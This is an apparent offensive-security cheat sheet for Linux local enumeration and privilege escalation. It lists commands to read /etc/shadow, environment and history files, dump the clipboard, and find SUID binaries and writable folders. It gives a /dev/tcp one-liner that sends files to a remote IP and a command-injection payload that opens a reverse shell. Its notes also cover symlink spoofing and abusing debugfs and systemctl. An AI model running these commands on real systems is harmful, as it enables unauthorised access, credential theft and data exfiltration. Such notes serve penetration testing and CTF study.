# Enumeration
## Commands
```bash
# SUDO CONFIG
sudo -l

# CURRENT USER INFO
id || (whoami && groups) 2>/dev/null
## Current user PGP keys
gpg --list-keys 2>/dev/null


# ALL USERS
## List superusers
awk -F: '($3 == "0") {print}' /etc/passwd

## List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort

## Logged in users
w


# SYSTEM INFO
## Running processes
ps aux

## Environment variables
(env || set) 2>/dev/null

## Network topology
cat /proc/net/fib_trie

## Domain name
hostname

## OS info
/etc/os-release


# FILES AND DIRECTORIES
## Sort files by date
ls -ltrh

## Writeable folders
find / -writable -type d 2>/dev/null

## Find SUID files
find / -perm -4000 2>/dev/null


# NETWORK
## List open ports
(netstat -punta || ss --ntpu)


# MISC
## Human readable JSON data (jq)
cat <json_file> | jq

## Download file from shell session
cat <file> /dev/tcp/<ip>/<port>

## PING SWEEP - If one suspects that there are other machines on the network --- Assuming that current machine is in a VM or a container
for i in {1..254}; do (ping -c 1 10.10.10.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
```

## Directories / Files
```bash
~/
/tmp

/dev/shm

/opt

/var
/var/log
/var/www/html

/usr/sbin

/etc/apache2 
/etc/httpd
/etc/nginx

/etc/hosts
/etc/issue
/etc/motd
/etc/passwd 
/etc/group 
/etc/resolv.conf
/etc/shadow

/home/USERNAME/.bash_history
/home/USERNAME/.profile

/proc/sched_debug
/proc/net/fib_trie
/proc/version
/proc/self/environ
```

### Directory / file copy (symlink)
If there's a directory or a file that is being copied *(by some program, perhaps cron)*, one can either create a symlink or a direct spoof of the actual file so, that the copied item will be spoofed and contain the data the attacker wants.


# Clipboard
Look for anything interesting in the clipboard
```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

# Interesting groups
## Disk group
A user who is in the disk group, will probably have access to info on a given disk.

### debugfs
`debugfs` let's you debug a file system if you can read the device.       
With this, one can read files owned by a given user


# Bash file command execution
If a file executes a variable, one might be able to write payload to it.
## Example
**(program.sh)**
```bash
#!/bin/bash

echo -e "Input:\t"
read myvar

/bin/bash -c $myvar
```
The attacker can supply the following payload:
```
./program.sh '>& /dev/tcp/<IP>/<PORT> 0>&1'
```

# Services
[gtfobins help](https://gtfobins.github.io/gtfobins/systemctl/)

A service is defined by a `.service` file. `systemctl` is used to link it to `systemd` and then used again to start the service.      
What the service does is defined by the `.service` file.     

If a user has access to the `systemctl` binary they can make a service which can read file or even spawn a reverse shell.


# Raw image file conversion to actual image
Raw image data can be converted to an actual image to reveal its content.
## Gimp
1. Select the file and its type (Raw image data)
2. Select resolution (`cat /sys/class/graphics/fb0/virtual_size` if unknown)
3. Edit image types
4. Export as png